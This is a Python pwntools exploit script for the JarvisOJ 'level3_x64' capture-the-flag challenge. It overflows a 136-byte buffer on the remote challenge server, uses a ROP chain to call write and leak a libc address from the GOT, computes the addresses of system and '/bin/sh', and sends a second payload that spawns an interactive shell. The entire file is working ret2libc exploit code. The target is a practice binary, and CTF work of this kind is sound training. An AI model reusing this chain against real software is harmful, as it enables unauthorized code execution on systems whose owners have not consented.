from pwn import *


def x_man_level3_x64(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3_x64/[XMAN]level3_x64'):
    print('x_man_level3_x64 start')
    context(log_level='info', arch='amd64', os='linux')

    # target = process([file_name])
    target = remote('pwn2.jarvisoj.com', 9883)
    target_elf = ELF(file_name)
    # libc_elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_elf = ELF('/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3_x64/libc-2.19.so')

    pop_ret_gadget = p64(0x4006b3)  # pop rdi ; ret
    pop2_ret_gadget = p64(0x4006b1)  # pop rsi ; pop r15 ; ret

    vulnerable_func_ptr = p64(target_elf.symbols['vulnerable_function'])
    write_elf = p64(target_elf.plt['write'])
    write_got = p64(target_elf.got['write'])

    payload_1 = b'A' * 136

    #   write(1, &write_got, 4uLL)
    payload_1 += pop_ret_gadget + p64(0x1)
    payload_1 += pop2_ret_gadget + write_got + p64(0xdeadbeef)
    payload_1 += write_elf

    #   vulnerable_function()
    payload_1 += vulnerable_func_ptr

    target.sendline(payload_1)

    target.recvuntil('Input:\n')

    write_ptr = u64(target.recv(8))

    write_libc = libc_elf.symbols['write']
    system_libc = libc_elf.symbols['system']
    bin_sh_libc = next(libc_elf.search(b'/bin/sh'))

    system_ptr = p64(write_ptr - (write_libc - system_libc))
    bin_sh_ptr = p64(write_ptr + (bin_sh_libc - write_libc))

    payload_2 = b'A' * 136
    # system('/bin/sh')
    payload_2 += pop_ret_gadget + bin_sh_ptr + system_ptr

    target.sendline(payload_2)

    target.interactive()
    print('x_man_level3_x64 end')


if __name__ == '__main__':
    x_man_level3_x64()
